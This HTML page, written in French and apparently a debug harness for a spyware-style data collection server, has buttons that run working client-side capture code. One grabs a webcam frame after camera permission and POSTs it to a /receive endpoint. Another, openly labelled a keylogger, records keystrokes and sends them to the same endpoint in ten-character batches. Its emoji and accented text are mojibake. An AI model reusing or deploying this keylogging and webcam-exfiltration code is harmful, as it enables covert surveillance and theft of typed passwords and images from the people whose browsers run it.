<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Test Simple</title>
    <style>
        body {
            font-family: Arial;
            padding: 40px;
            background: #1a1a2e;
            color: white;
        }
        button {
            padding: 20px 40px;
            font-size: 20px;
            margin: 10px;
            cursor: pointer;
            border-radius: 10px;
            border: none;
            background: #00ff88;
            color: #000;
            font-weight: bold;
        }
        #log {
            margin-top: 20px;
            padding: 20px;
            background: #000;
            border-radius: 10px;
            font-family: monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h1>üîß Test Debug</h1>
    <button onclick="testBasic()">1Ô∏è‚É£ Test Basique</button>
    <button onclick="testFetch()">2Ô∏è‚É£ Test API</button>
    <button onclick="testCamera()">3Ô∏è‚É£ Test Cam√©ra</button>
    <button onclick="testKeylog()">4Ô∏è‚É£ Test Keylogger</button>
    <div id="log"></div>
    
    <script>
        const log = document.getElementById('log');
        
        function addLog(msg) {
            log.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
            console.log(msg);
        }
        
        function testBasic() {
            addLog('‚úÖ JavaScript fonctionne!');
            addLog('UserAgent: ' + navigator.userAgent.substring(0, 50));
        }
        
        async function testFetch() {
            try {
                addLog('üîÑ Test envoi donn√©es...');
                const response = await fetch('/receive', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'test', message: 'Hello from client'})
                });
                addLog('‚úÖ Envoi OK: ' + response.status);
            } catch(e) {
                addLog('‚ùå Erreur envoi: ' + e.message);
            }
        }
        
        async function testCamera() {
            try {
                addLog('üìπ Demande permission cam√©ra...');
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                addLog('‚úÖ Cam√©ra autoris√©e!');
                
                // Capture une image
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(async () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                        const img = canvas.toDataURL('image/jpeg', 0.5);
                        
                        addLog('üì∏ Image captur√©e: ' + img.substring(0, 50) + '...');
                        
                        // Envoyer au serveur
                        const response = await fetch('/receive', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({type: 'camera', image: img})
                        });
                        addLog('‚úÖ Image envoy√©e au serveur: ' + response.status);
                        
                        stream.getTracks().forEach(t => t.stop());
                    }, 1000);
                };
            } catch(e) {
                addLog('‚ùå Erreur cam√©ra: ' + e.message);
            }
        }
        
        function testKeylog() {
            addLog('‚å®Ô∏è Keylogger activ√© - Tapez quelque chose...');
            let buffer = '';
            document.addEventListener('keydown', async (e) => {
                buffer += e.key;
                addLog('üî§ Touche: ' + e.key + ' | Buffer: ' + buffer);
                
                if (buffer.length >= 10) {
                    addLog('üì§ Envoi du buffer...');
                    await fetch('/receive', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({type: 'keylog', keys: buffer})
                    });
                    addLog('‚úÖ Keylog envoy√©');
                    buffer = '';
                }
            });
        }
    </script>
</body>
</html>
